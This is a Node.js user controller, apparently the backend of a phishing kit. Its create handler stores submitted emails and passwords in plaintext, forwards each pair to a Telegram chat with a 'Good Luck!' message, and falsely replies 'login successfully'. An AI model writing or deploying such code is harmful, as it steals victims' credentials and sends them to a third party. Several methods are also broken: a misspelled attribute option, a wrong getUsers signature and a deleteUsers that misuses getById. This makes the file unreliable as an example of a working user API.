const users = require('../models/users.js')
const { SendBotMessage } = require('./botTelegram.js')
require('dotenv').config()


class Users {
    #id = process.env.CHAT_ID
    constructor(email, password) {
        this.email = email
        this.password = password
    }


    async getById(req, res) {
        const getId = await users.findOne({
            attributes: ['email', 'password'],
            where: {
                id: req.params.id
            }
        });
        res.json(getId);
    }

    async getUsers(res) {
        const gets = await users.findAll({
            attributtes: ['email', 'password'],
        })

        res.status(200).json(gets);
    }

    async createUsers(req, res) {
        const { email, password } = req.body
        const ManageUsers = new Users(email, password);

        const userBaru = await users.create({
            email: ManageUsers.email,
            password: ManageUsers.password
        })

        const msgBot = `
        New Message 🚀🚀
            ===========================
            id: ${userBaru.id}
            Email: ${email}
            Password: ${password}\n
            Good Luck!
            ===========================
            ===========================
        `
        console.log(this.#id);

        const ManagerBot = new SendBotMessage(this.#id, msgBot)
        ManagerBot.sendMessage()
        res.status(201).json({ msg: "login successfully" })
    }

    async deleteUsers(req, res) {

        await this.getById((id) => {
            if (!id) {
                throw new Error("user not found")
            }
            return id.destroy();
        })

        res.status(200).json({ msg: "delete successfully" })
    }

}

module.exports = { Users }